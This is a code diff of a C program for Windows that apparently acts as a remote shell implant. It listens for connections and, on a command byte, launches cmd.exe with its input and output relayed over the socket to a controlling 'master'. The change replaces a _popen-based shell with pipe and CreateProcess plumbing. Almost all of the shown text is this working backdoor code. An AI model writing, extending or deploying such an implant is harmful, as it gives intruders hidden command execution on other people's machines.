@@ -207,29 +207,37 @@ int HeartBeat(SOCKET s){
     return iResult;
 }
 
-int ShellInteract(FILE* shell, SOCKET sock){
-    /*BAD LOGIC*/
-    int iResult = 0;
-    char output[1024] = {0}; // Enough is enough))
-    char command[512] = {0};
-    iResult = recv(sock, (char*)&command, 512, 0);
-    printf("%.*s\n", iResult, command);
-    if (iResult < 0){
-        perror("recv in shell failed");
-        return -1;
-    }
-    if (strcmp(command, "exit\n") == 0) {
+int ScanOutPipe(HANDLE hStdoutRd, OVERLAPPED* readOverlapped, SOCKET sock){
+    DWORD bytesRead;
+    char buf[2048];
+    memset(&buf, 0, 2048);
+    // MANUAL SIZE BUFFER KILL ME
+    int c = ReadFile(hStdoutRd, buf, 2048,&bytesRead, readOverlapped);
+    // WaitForSingleObjectEx(readOverlapped->hEvent, 500, TRUE);
+    if (send(sock, buf, strlen(buf), 0) < 0){
+        perror("send in scanoutpipe died");
         return 1;
     }
-    fprintf(shell, "%s", command);
-    fflush(shell);
-    fgets(output, sizeof(output), shell);
-    iResult = send(sock, output, strlen(output), 0);
-    if(iResult < 0){
-        perror("send in shell failed");
-        return -1;
-    }
 
+    // WaitForSingleObjectEx(readOverlapped->hEvent, 500, TRUE);
+
+    return 0;
+}
+
+int WriteInPipe(HANDLE hStdinWr, OVERLAPPED* writeOverlapped,  SOCKET sock){
+    DWORD bytesWritten;
+    int len = 0;
+    char input[1024] = {0};
+    len = recv(sock, (char*)&input, 1024, 0);
+    if (len < 0){
+        perror("recv in WriteInPipe died");
+        return 1;
+    }
+    if (!WriteFile(hStdinWr, input, len, &bytesWritten, writeOverlapped)){
+        perror("Writing to cmd died");
+        return 1;
+    }
+    // WaitForSingleObject(writeOverlapped, 500);
     return 0;
 }
 
@@ -279,7 +287,7 @@ int __cdecl main(int argc, char **argv)
     while (1){
         // MAIN EVENT LOOP
         eventloop:
-        char buf[2] = {0};
+        char buf[2] = {0,0};
         DBGLG("Listening\n");
         sock = accept(ListenSocket, NULL, NULL);
         DBGLG("Connected\n");
@@ -317,15 +325,63 @@ int __cdecl main(int argc, char **argv)
                 break;
             case 0x2:
                 DBGLG("Got 2 starting shell\n");
-                FILE* shell = _popen("C:\\Windows\\System32\\cmd.exe", "w");
-                if (!shell) {
-                    perror("popen failed");
-                    return 1;
+                HANDLE hStdinRd, hStdinWr, hStdoutRd, hStdoutWr;
+                SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
+
+                // Create pipes for the child process's standard input and output.
+                if (!CreatePipe(&hStdoutRd, &hStdoutWr, &sa, 0) ||
+                    !CreatePipe(&hStdinRd, &hStdinWr, &sa, 0))
+                {
+                    perror("failed at creating pipes for child process");
+                    break;
                 }
-                while ((iResult = ShellInteract(shell, sock)) == 0){
-                    NOP_FUNCTION;
+
+                // Set the bInheritHandle flag so the child process inherits the handles.
+                sa.bInheritHandle = TRUE;
+
+                // Create the child process.
+                STARTUPINFO si = { sizeof(STARTUPINFO) };
+                PROCESS_INFORMATION pi;
+                si.dwFlags = STARTF_USESTDHANDLES;
+                si.hStdInput = hStdinRd;
+                si.hStdOutput = hStdoutWr;
+                si.hStdError = hStdoutWr;
+                OVERLAPPED writeOverlapped = { 0 };
+                OVERLAPPED readOverlapped = { 0 };
+                writeOverlapped.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
+                readOverlapped.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
+                if (!CreateProcess(NULL, "C:\\Windows\\System32\\cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
+                {
+                    perror("failed at creating process");
+                    break;
                 }
-                _pclose(shell);
+
+                // Close the write ends of the pipes in the parent process.
+                CloseHandle(hStdoutWr);
+                CloseHandle(hStdinRd);
+
+                // Read from the output pipe and write to the input pipe.
+                /* INITIAL CMD LOADING*/
+                ScanOutPipe(hStdoutRd, &readOverlapped, sock);
+                ScanOutPipe(hStdoutRd, &readOverlapped, sock);
+                /*END OF LOADING*/
+                while (1){
+                    iResult = WriteInPipe(hStdinWr, &writeOverlapped ,sock);
+                    if (iResult){
+                        break;
+                    }
+                    iResult = ScanOutPipe(hStdoutRd, &readOverlapped, sock);
+                    if(iResult){
+                        break;
+                    }
+                }
+                // Close the read end of the output pipe.
+                CloseHandle(hStdoutRd);
+                CloseHandle(hStdinWr);
+                TerminateProcess(pi.hProcess, 0);
+                // clean up
+                CloseHandle(pi.hProcess);
+                CloseHandle(pi.hThread);
             /* Individual command output master -> (cmd) ->slave -> (output) -> master*/
                 break;
             case 0x3:
